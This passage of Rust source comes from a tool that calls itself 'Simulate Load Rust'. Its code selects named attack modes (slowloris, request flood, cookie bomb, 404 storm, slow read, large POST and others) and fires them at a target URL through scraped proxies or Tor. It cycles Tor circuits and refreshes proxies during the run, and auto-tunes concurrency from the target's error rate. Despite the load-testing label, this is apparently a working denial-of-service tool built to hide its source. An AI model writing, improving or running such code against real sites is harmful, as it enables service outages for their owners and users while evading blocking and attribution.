        pinned_dns: pinned_ip.map(|ip| {
            let u = Url::parse(&target_url).unwrap_or_else(|_| Url::parse(DEFAULT_TARGET_URL).unwrap());
            (u.host_str().unwrap_or("").to_string(), ip)
        }),
        pool_max_idle,
        pool_idle_timeout: Duration::from_secs(pool_idle_timeout_secs),
        sni: sni.clone(),
    };

    if tor_only {
        let state = Arc::new(Mutex::new(AppState::new()));
        {
            let mut st = state.lock().await;
            st.target_url = target_url.to_string();
            st.mode = ProxyMode::Tor;
            st.client_config = config.clone();
        }
        println!("[tor-only] Checking Tor...");
        let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
        if !ok && tor_proxy.is_none() {
            eprintln!("  [tor-only] Tor not available. Install Tor or use --tor-proxy.");
            std::process::exit(1);
        }
        if ok {
            println!("  Tor OK (local relay)");
        } else {
            println!("  Using custom Tor proxy");
        }
        println!("  [TOR-ONLY] Configuration verified. Ready for Tor-based load testing.");
        return;
    }

    if verify {
        println!("=== Simulate Load Rust ===");
        println!("Target: {}", target_url);
        println!("Mode: {} (proxy: {})", attack_str, mode_str);
        println!("Concurrency: {}  Duration: {}s", concurrency, duration_secs);
        println!("");

        // Probe domain
        let state = Arc::new(Mutex::new(AppState::new()));
        if mode_str == "tor" || mode_str == "scrape-tor" {
            if tor_entry_guards.is_some() || tor_bridges.is_some() || tor_circuit_timeout.is_some() {
                println!("  [verify] Configuring Tor parameters via Control Port ({})...", tor_control);
                if let Err(e) = configure_tor(&tor_control, tor_entry_guards.as_deref(), tor_bridges.as_deref(), tor_circuit_timeout).await {
                    eprintln!("  [verify] Warning: Failed to configure Tor via Control Port: {}", e);
                } else {
                    println!("  [verify] Tor parameters applied successfully.");
                }
            }
        }
        {
            let mut st = state.lock().await;
            st.target_url = target_url.to_string();
            st.load_concurrency = concurrency;
            st.custom_selector = custom_selector.clone();
            st.client_config = config.clone();
            st.attack_mode = match attack_str.as_str() {
                "bandwidth" => AttackMode::Bandwidth,
                "slowread" => AttackMode::SlowRead,
                "imageopt" => AttackMode::ImageOpt,
                "largepost" => AttackMode::LargePost,
                "assetspray" => AttackMode::AssetSpray,
                "rangereq" => AttackMode::RangeReq,
                "cookiebomb" => AttackMode::CookieBomb,
                "ssr" => AttackMode::SSR,
                "middleware" => AttackMode::Middleware,
                "requestflood" => AttackMode::RequestFlood,
                "notfound" => AttackMode::NotFound,
                "slowloris" => AttackMode::Slowloris,
                _ => AttackMode::Normal,
            };
            match mode_str.as_str() {
                "tor" => st.mode = ProxyMode::Tor,
                "scrape-tor" => st.mode = ProxyMode::ScrapeTorFallback,
                _ => st.mode = ProxyMode::Scrape,
            }
        }

        println!("[1/2] Probing domain...");
        probe_domain(&target_url, &state).await;
        let status = {
            let st = state.lock().await;
            st.probe_status.clone()
        };
        println!("  {}", status);
        println!("");

        println!("[2/2] Verifying proxies...");
        let proxies = if let Some(path) = &proxy_file {
            let content = std::fs::read_to_string(path).unwrap_or_default();
            let list: Vec<String> = content
                .split(|c: char| c.is_whitespace() || c == ',')
                .filter_map(|s| { let s = s.trim(); if !s.is_empty() { Some(s.to_string()) } else { None }})
                .collect();
            if list.is_empty() {
                None
            } else {
                println!("  Verifying {} proxies from file...", list.len());
                let verified = filter_alive_proxies(&list, &state).await;
                Some(verified)
            }
        } else if let Some(url) = &tor_proxy {
            let n = concurrency.min(20);
            let mut p = Vec::with_capacity(n);
            for i in 0..n { p.push(format!("socks5://tor{}:isolate@{}", i, url.trim_start_matches("socks5://").trim_start_matches("http://"))); }
            Some(p)
        } else {
            let mode = { state.lock().await.mode };
            get_proxies(mode, &state).await
        };
        match proxies {
            Some(prox_list) => {
                println!("  Acquired {} proxies", prox_list.len());
                if let Some(path) = &save_proxies {
                    let content = prox_list.join("\n");
                    std::fs::write(path, content).unwrap();
                    println!("  Saved {} proxies to {}", prox_list.len(), path);
                }
                println!("  [VERIFIED] Proxy health check complete.");
            }
            None => {
                eprintln!("  Failed to get proxies.");
                std::process::exit(1);
            }
        }
        return;
    }

    if version {
        println!("{} v{}", env!("CARGO_PKG_NAME"), env!("CARGO_PKG_VERSION"));
        return;
    }
    if list_modes {
        println!("Attack modes:");
        println!("  normal        Standard HTTP GET requests with human-like referer trail");
        println!("  bandwidth     Heavy bandwidth consumption");
        println!("  slowread      Slow read (deliberate slow download)");
        println!("  imageopt      Image optimization endpoints");
        println!("  largepost     Large JSON/POST requests with payload templates");
        println!("  assetspray    Spray all static assets");
        println!("  rangereq      Range header requests");
        println!("  cookiebomb    Cookie bomb (many cookies)");
        println!("  ssr           Server-side rendering endpoints");
        println!("  middleware    Middleware/edge endpoint stress");
        println!("  requestflood  No-delay request flood");
        println!("  notfound      404 storm (nonexistent paths)");
        println!("  slowloris     Slow POST/Slowloris stream connection exhaust");
        return;
    }

    println!("=== Simulate Load Rust ===");
    println!("Target: {}", target_url);
    println!("Mode: {} (proxy: {})", attack_str, mode_str);
    println!("Concurrency: {}  Duration: {}s", concurrency, duration_secs);
    println!("");

    // Probe domain
    let state = Arc::new(Mutex::new(AppState::new()));
    if mode_str == "tor" || mode_str == "scrape-tor" {
        if tor_entry_guards.is_some() || tor_bridges.is_some() || tor_circuit_timeout.is_some() {
            println!("  Configuring Tor parameters via Control Port ({})...", tor_control);
            if let Err(e) = configure_tor(&tor_control, tor_entry_guards.as_deref(), tor_bridges.as_deref(), tor_circuit_timeout).await {
                eprintln!("  Warning: Failed to configure Tor via Control Port: {}", e);
            } else {
                println!("  Tor parameters applied successfully.");
            }
        }
    }
    {
        let mut st = state.lock().await;
        st.target_url = target_url.to_string();
        st.load_concurrency = concurrency;
        st.jitter_ms = jitter_ms;
        st.custom_selector = custom_selector.clone();
        st.client_config = config.clone();
        st.attack_mode = match attack_str.as_str() {
            "bandwidth" => AttackMode::Bandwidth,
            "slowread" => AttackMode::SlowRead,
            "imageopt" => AttackMode::ImageOpt,
            "largepost" => AttackMode::LargePost,
            "assetspray" => AttackMode::AssetSpray,
            "rangereq" => AttackMode::RangeReq,
            "cookiebomb" => AttackMode::CookieBomb,
            "ssr" => AttackMode::SSR,
            "middleware" => AttackMode::Middleware,
            "requestflood" => AttackMode::RequestFlood,
            "notfound" => AttackMode::NotFound,
            "slowloris" => AttackMode::Slowloris,
            _ => AttackMode::Normal,
        };

        match mode_str.as_str() {
            "tor" => st.mode = ProxyMode::Tor,
            "scrape-tor" => st.mode = ProxyMode::ScrapeTorFallback,
            _ => st.mode = ProxyMode::Scrape,
        }
    }

    println!("[1/3] Probing domain...");
    probe_domain(&target_url, &state).await;
    let status = {
        let st = state.lock().await;
        st.probe_status.clone()
    };
    println!("  {}", status);
    println!("");
    println!("[2/3] Acquiring proxies...");
    // Handle --proxy-file and --tor-proxy first (bypass scraping)
    let proxies = if let Some(path) = &proxy_file {
        let content = std::fs::read_to_string(path).unwrap_or_default();
        let list: Vec<String> = content
            .split(|c: char| c.is_whitespace() || c == ',')
            .filter_map(|s| { let s = s.trim(); if !s.is_empty() { Some(s.to_string()) } else { None }})
            .collect();
        if list.is_empty() {
            eprintln!("  No proxies found in file {}", path);
            None
        } else {
            println!("  Verifying {} proxies from file...", list.len());
            let verified = filter_alive_proxies(&list, &state).await;
            if verified.is_empty() {
                eprintln!("  No alive proxies found in file {}", path);
                None
            } else {
                Some(verified)
            }
        }
    } else if let Some(url) = &tor_proxy {
        let n = concurrency.min(20);
        let mut p = Vec::with_capacity(n);
        for i in 0..n { p.push(format!("socks5://tor{}:isolate@{}", i, url.trim_start_matches("socks5://").trim_start_matches("http://"))); }
        println!("  Using TOR_PROXY: {} ({} circuits)", url, n);
        Some(p)
    } else {
        let mode = { state.lock().await.mode };
        get_proxies(mode, &state).await
    };
    match proxies {
        None => {
            eprintln!("  Failed to get proxies. Exiting.");
            std::process::exit(1);
        }
        Some(prox_list) => {
            println!("  Got {} proxies", prox_list.len());
            if dry_run {
                println!("  [DRY RUN] Skipping load test. Use without --dry-run to execute.");
                // Write CSV output if requested
                if let Some(path) = &output_csv {
                    write_probe_csv(path, &target_url, &status, &prox_list, concurrency, &attack_str);
                }
                return;
            }
            let pool = Arc::new(std::sync::Mutex::new(ProxyPool::new(&prox_list, &config)));
            println!("[3/3] Running load for {}s...", duration_secs);
            {
                let mut s_vec = Vec::with_capacity(prox_list.len());
                for _ in 0..prox_list.len() {
                    s_vec.push(std::sync::Mutex::new(String::new()));
                }
                state.lock().await.sessions = Arc::new(s_vec);
            }
            let stats = {
                let st = state.lock().await;
                st.stats.clone()
            };
            stats.concurrency.store(concurrency, Ordering::Relaxed);
            stats.running.store(true, Ordering::Relaxed);
            
            let state_clone = state.clone();
            let pool_clone = pool.clone();
            let stats_clone = stats.clone();
            let start = Instant::now();
            let mut elapsed_secs = duration_secs;
            tokio::spawn(run_load(state_clone, pool_clone, stats_clone, delay_ms, max_errors));

            // Tor Circuit Cycling Background Loop
            if mode_str == "tor" || mode_str == "scrape-tor" {
                let tor_ctrl = tor_control.clone();
                let stats_tor = stats.clone();
                tokio::spawn(async move {
                    while stats_tor.running.load(Ordering::Relaxed) {
                        tokio::time::sleep(Duration::from_secs(30)).await;
                        if !stats_tor.running.load(Ordering::Relaxed) { break; }
                        let _ = cycle_tor_circuit(&tor_ctrl).await;
                    }
                });
            }

            // Proxy Pool Refresh Background Loop
            if mode_str == "scrape" || mode_str == "scrape-tor" {
                let pool_refresh = pool.clone();
                let state_refresh = state.clone();
                let stats_refresh = stats.clone();
                let config_refresh = config.clone();
                tokio::spawn(async move {
                    while stats_refresh.running.load(Ordering::Relaxed) {
                        tokio::time::sleep(Duration::from_secs(60)).await;
                        if !stats_refresh.running.load(Ordering::Relaxed) { break; }
                        if let Some(new_proxies) = get_proxies(ProxyMode::Scrape, &state_refresh).await {
                            let mut pool_lock = pool_refresh.lock().unwrap();
                            let fresh_pool = ProxyPool::new(&new_proxies, &config_refresh);
                            pool_lock.clients.extend(fresh_pool.clients);
                            pool_lock.labels.extend(fresh_pool.labels);
                            let new_n = pool_lock.clients.len();
                            pool_lock.cooldown_until.resize(new_n, Instant::now());
                            pool_lock.failure_tier.resize(new_n, 0);
                            pool_lock.succeeded.resize(new_n, false);
                            pool_lock.is_tor.resize(new_n, false);
                            pool_lock.weights.resize(new_n, 1.0);
                        }
                    }
                });
            }

            // PID Concurrency Auto-tuning Loop
            if auto_tune {
                let stats_tune = stats.clone();
                let state_tune = state.clone();
                let is_tor_mode = mode_str == "tor" || mode_str == "scrape-tor";
                tokio::spawn(async move {
                    let mut last_errors = 0u64;
                    while stats_tune.running.load(Ordering::Relaxed) {
                        tokio::time::sleep(Duration::from_secs(2)).await;
                        if !stats_tune.running.load(Ordering::Relaxed) { break; }
                        
                        let cur_errors = stats_tune.errors.load(Ordering::Relaxed);
                        let new_errors = cur_errors.saturating_sub(last_errors);
                        last_errors = cur_errors;
                        
                        let (p50, _, _, _) = stats_tune.latency_samples.get_percentiles();
                        let current_conc = stats_tune.concurrency.load(Ordering::Relaxed);
                        
                        let mut target_conc = current_conc;
                        if new_errors > 5 || p50 > 1500 {
                            target_conc = target_conc.saturating_sub(5).max(5);
                        } else if p50 < 400 {
                            let inc = if is_tor_mode && current_conc >= tor_ssthresh { 1 } else { 2 };
                            target_conc = target_conc.saturating_add(inc).min(500);
                        }
                        
                        if target_conc != current_conc {
                            stats_tune.concurrency.store(target_conc, Ordering::Relaxed);
                            state_tune.lock().await.load_concurrency = target_conc;
                        }
                    }
                });
            }

            let mut last_requests = 0u64;
            let mut last_bytes = 0u64;
            let mut last_time = start;

            while start.elapsed().as_secs() < duration_secs {
                tokio::time::sleep(Duration::from_millis(1000)).await;
                let cur_reqs = stats.total_requests.load(Ordering::Relaxed);
                let cur_bytes = stats.total_bytes.load(Ordering::Relaxed);
                let cur_errors = stats.errors.load(Ordering::Relaxed);
                let cur_latency = stats.total_latency_ms.load(Ordering::Relaxed);

                let now = Instant::now();
                let delta_t = now.duration_since(last_time).as_secs_f64();
                
                let mut req_rate = 0.0;
                let mut byte_rate = 0.0;
                if delta_t > 0.0 {
                    req_rate = (cur_reqs - last_requests) as f64 / delta_t;
                    byte_rate = (cur_bytes - last_bytes) as f64 / delta_t / 1024.0;
                }
                let avg_latency = if cur_reqs > 0 { cur_latency as f64 / cur_reqs as f64 } else { 0.0 };
                
                let (p50, p90, p95, p99) = stats.latency_samples.get_percentiles();
                let active_concurrency = stats.concurrency.load(Ordering::Relaxed);
                let elapsed = start.elapsed().as_secs();

                if tui {
                    print!("{}[2J{}[1;1H", 27 as char, 27 as char);
                    println!("========================================================================");
                    println!("   🚀 SIMULATE LOAD RUST — Interactive Testing Dashboard");
                    println!("========================================================================");
                    println!("   Target URL:  {}", target_url);
                    println!("   Attack Mode: {} | Concurrency: {} | Duration: {}s", attack_str, active_concurrency, duration_secs);
                    if let Some((ref host, ip)) = config.pinned_dns {
                        println!("   DNS Pinning: Enabled ({}) -> IP: {}", host, ip);
                    } else {
                        println!("   DNS Pinning: Disabled");
                    }
                    println!("========================================================================");
                    let pct = (elapsed as f64 / duration_secs as f64 * 100.0).min(100.0) as usize;
                    let filled = pct / 4;
                    let empty = 25 - filled;
                    let bar: String = std::iter::repeat("█").take(filled).chain(std::iter::repeat("░").take(empty)).collect();
                    println!("   [Progress]   [{}] {}% (Elapsed: {}s)", bar, pct, elapsed);
                    println!("========================================================================");
                    println!("   [Metrics]");
                    println!("   Req/s:       {:.1} req/s          Bandwidth:   {:.2} KB/s", req_rate, byte_rate);
                    println!("   Successes:   {} (2xx)           Errors:      {} (avg error rate: {:.2}%)", 
                        stats.status_2xx.load(Ordering::Relaxed), 
                        cur_errors, 
                        if cur_reqs > 0 { cur_errors as f64 / (cur_reqs + cur_errors) as f64 * 100.0 } else { 0.0 }
                    );
                    println!("   Average RTT: {:.1} ms                Active Prox: {} / {}", 
                        avg_latency, 
                        prox_list.len().saturating_sub(cur_errors as usize), 
                        prox_list.len()
                    );
                    println!("========================================================================");
                    println!("   [Latency Percentiles]");
                    println!("   p50: {}ms   |   p90: {}ms   |   p95: {}ms   |   p99: {}ms", p50, p90, p95, p99);
                    println!("========================================================================");
                    println!("   [Response Codes]");
                    println!("   2xx: {}  |  3xx: {}  |  4xx: {}  |  5xx: {}  |  Other: {}",
                        stats.status_2xx.load(Ordering::Relaxed),
                        stats.status_3xx.load(Ordering::Relaxed),
                        stats.status_4xx.load(Ordering::Relaxed),
                        stats.status_5xx.load(Ordering::Relaxed),
                        stats.status_other.load(Ordering::Relaxed)
                    );
                    println!("========================================================================");
                } else {
                    println!(
                        "  [Elapsed: {}s] {:.1} req/s | {:.2} KB/s | Latency: {:.1}ms (p50: {}ms, p99: {}ms) | 2xx: {} | 3xx: {} | 4xx: {} | 5xx: {} | Errors: {}",
                        elapsed, req_rate, byte_rate, avg_latency, p50, p99,
                        stats.status_2xx.load(Ordering::Relaxed),
                        stats.status_3xx.load(Ordering::Relaxed),
                        stats.status_4xx.load(Ordering::Relaxed),
                        stats.status_5xx.load(Ordering::Relaxed),
                        cur_errors
                    );
                }
                
                last_requests = cur_reqs;
                last_bytes = cur_bytes;
                last_time = now;

                if max_errors.is_some() && cur_errors >= max_errors.unwrap() {
                    elapsed_secs = start.elapsed().as_secs().max(1);
                    break;
                }
            }
            stats.running.store(false, Ordering::Relaxed);

            let final_reqs = stats.total_requests.load(Ordering::Relaxed);
            let final_bytes = stats.total_bytes.load(Ordering::Relaxed);
            let final_latency = stats.total_latency_ms.load(Ordering::Relaxed);
            let final_avg_latency = if final_reqs > 0 { final_latency as f64 / final_reqs as f64 } else { 0.0 };
            
            let (p50, p90, p95, p99) = stats.latency_samples.get_percentiles();
            
            let final_stats = format!(
                "Completed: {} req, {} bytes ({:.2} KB/s) | Avg Latency: {:.1}ms (p50: {}ms, p90: {}ms, p95: {}ms, p99: {}ms) | 2xx: {} | 3xx: {} | 4xx: {} | 5xx: {} | Errors: {}",
                final_reqs,
                final_bytes,
                final_bytes as f64 / elapsed_secs as f64 / 1024.0,
                final_avg_latency,
                p50, p90, p95, p99,
                stats.status_2xx.load(Ordering::Relaxed),
                stats.status_3xx.load(Ordering::Relaxed),
                stats.status_4xx.load(Ordering::Relaxed),
                stats.status_5xx.load(Ordering::Relaxed),
                stats.errors.load(Ordering::Relaxed)
            );
            println!("  {}", final_stats);
            if let Some(ref path) = output_csv {
                write_results_csv(path, &target_url, &status, &prox_list, concurrency, &attack_str,
                    final_reqs, final_bytes, elapsed_secs);
            }
        }
    }
}
